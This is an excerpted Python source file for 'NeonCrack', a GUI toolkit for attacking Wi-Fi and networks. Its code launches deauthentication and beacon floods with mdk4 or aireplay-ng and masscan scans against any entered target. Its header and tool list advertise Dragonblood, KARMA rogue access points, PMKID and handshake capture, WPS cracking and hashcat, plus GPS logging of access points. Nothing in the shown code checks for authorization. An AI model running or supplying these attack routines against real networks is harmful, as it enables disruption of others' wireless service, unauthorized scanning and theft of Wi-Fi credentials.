#!/usr/bin/env python3
"""
NeonCrack v3.7.0 – cyber-punk Swiss-Army Wi-Fi / network toolkit
────────────────────────────────────────────────────────────────
NEW  • Masscan panel       (Scan tab)
     • Dependency Doctor   (🛠 Utilities tab)
     • GPS → KML logging   (Scan tab “GPS-KML” toggle)

Everything from v3.6.x remains: Dragonblood, KARMA, PMKID/Handshake, WPS,
Deauth, Beacon, Mass-PMKID, nmap panel, bandwidth graph, Sticky-Monitor, etc.

Debian/Kali packages you may need:
  sudo apt install masscan gpsd gpsd-clients python3-gpxpy
"""

# ───────── imports ─────────────────────────────────────────────────────────
import os, subprocess, threading, csv, time, signal, sys, re, collections, shutil, json
from datetime import datetime
from collections import Counter
from tkinter import *
from tkinter import ttk, filedialog, scrolledtext, messagebox, simpledialog
import psutil, xml.etree.ElementTree as ET
...
root = Tk(); root.title("NeonCrack v3.7.0"); root.configure(bg=BGC); root.geometry("1080x850")

# Tk variables
iface_var, target_var = StringVar(), StringVar()
scan_time            = IntVar(value=45)
use_gps              = BooleanVar(value=False)
...
masscan_ports        = StringVar(value="top-1000")
...
def log(box, txt): box.insert(END, txt+"\n"); box.see(END)
...
def get_gps_fix():
    try:
        out=subprocess.check_output(["gpspipe","-w","-n","3"],
                                    text=True,timeout=4)
...
def poll_bw(iface):
    ...
    while not bw_stop.is_set():
        ...
        try: now = psutil.net_io_counters(pernic=True)[iface]
            ...
            log(utils_out,"iface disappeared"); break
...
def do_scan(channel_hop=False):
    ...
    gps_pts=[]
    end=time.time()+scan_time.get()
    while time.time()<end and scan_proc.poll() is None:
        if use_gps.get():
            lat,lon=get_gps_fix()
            if lat: gps_pts.append((lat,lon,"AP marker"))
        time.sleep(1)
    ...
    if gps_pts:
        kml=os.path.join(CAP_DIR,f"scan_{ts}.kml"); write_kml(gps_pts,kml)
        log(scan_out,f"[+] KML saved → {kml}")
...
def start_masscan():
    ...
    if not tgt: messagebox.showinfo("Target","Enter target/CIDR"); return
    if shutil.which("masscan") is None:
        messagebox.showerror("missing","install masscan"); return
    ports=masscan_ports.get()
    if ports.startswith("top-"): ports=f"top-{ports.split('-')[1]}"
    out=os.path.join(CAP_DIR,f"masscan_{tgt.replace('/','_')}_{int(time.time())}.log")
    cmd=["masscan","-p",ports,"--rate","5000",tgt]
    log(scan_out,"[*] "+" ".join(cmd))
    run_logged(cmd,scan_out,out)

# ───────── Dependency Doctor ───────────────────────────────────────────────
REQ_TOOLS=["aircrack-ng","hcxdumptool","hcxpcapngtool","hashcat","dragondown",
           "reaver","bully","wash","mdk4","hostapd-mana","airbase-ng",
           "nmap","masscan","gpspipe"]
def run_doctor():
    utils_out.delete("1.0",END)
    missing=[t for t in REQ_TOOLS if shutil.which(t) is None]
    for t in REQ_TOOLS:
        utils_out.insert(END,f"{'✅' if t not in missing else '❌'} {t}\n")
    if not missing:
        utils_out.insert(END,"\nAll good.\n"); return
    if messagebox.askyesno("Doctor","Install missing via apt?"):
        pkgs={"dragondown":"hashcat-utils","wash":"reaver","gpspipe":"gpsd-clients"}
        apt=[pkgs.get(t,t) for t in missing]
        run_logged(["apt","install","-y",*apt],utils_out)

# ───────── Handshake monitor, attack routines, crack, hash, cleaner,
...
def start_deauth():
    ...
    if shutil.which("mdk4"):
        cmd=["mdk4",mon,"d","-B",bssid]; tag="mdk4"
    else:
        cmd=["aireplay-ng","--deauth","0","-a",bssid,mon]; tag="aireplay"
...
def start_beacon():
    ...
    global attack_proc; attack_proc=run_logged(
        ["mdk4",mon,"b","-f",ssidfile,"-c","1,6,11"],att_out,ssidfile+".log")
...
def show_stats(): run_doctor()   # re-use doctor output for convenience
...
Spinbox(row,from_=15,to=180,textvariable=scan_time,width=6
...
Checkbutton(row,text="GPS-KML",variable=use_gps,bg=BGC,fg=NEON,
            selectcolor=BGC,activebackground=BGC).grid(row=0,column=8,padx=6)

Frame(ts,height=2,bg=NEON).pack(fill=X,pady=6)

nrow=Frame(ts,bg=BGC); nrow.pack(fill=X,pady=2)
Label(nrow,text="Target",bg=BGC,fg=NEON).grid(row=0,column=0,padx=4)
...
Label(nrow,text="masscan ports",bg=BGC,fg=NEON).grid(row=1,column=0,sticky="e",padx=4)
Entry(nrow,textvariable=masscan_ports,width=10).grid(row=1,column=1,sticky="w")
Button(nrow,text="Run masscan",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=start_masscan,daemon=True).start()
...
# Utilities tab
ut=tabs["utils"]
Checkbutton(ut,text="Sticky Monitor (keep iface in monitor mode)",
            variable=sticky_mon,bg=BGC,fg=NEON,
            selectcolor=BGC,activebackground=BGC).pack(anchor="w",padx=12,pady=4)
Button(ut,text="Dependency Doctor",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=run_doctor,daemon=True).start()
).pack(pady=4)
utils_out=scrolledtext.ScrolledText(ut,width=115,height=12,bg="#0d0d17",
                                    fg=NEON,font=("Consolas",10)); utils_out.pack()
bw_f=Frame(ut,bg=BGC); bw_f.pack(pady=10,fill=X)
Label(bw_f,text="Broadband iface:",bg=BGC,fg=NEON).pack(side=LEFT)
Entry(bw_f,textvariable=mon_iface_var,width=12).pack(side=LEFT,padx=4)
Button(bw_f,text="Start",bg=ACCENT,fg="white",
       command=start_bw_monitor).pack(side=LEFT,padx=4)
Button(bw_f,text="Stop",bg="#ff0030",fg="white",
...
Button(ut,text="Show Stats (hashcat pot)",bg=ACCENT,fg="white",
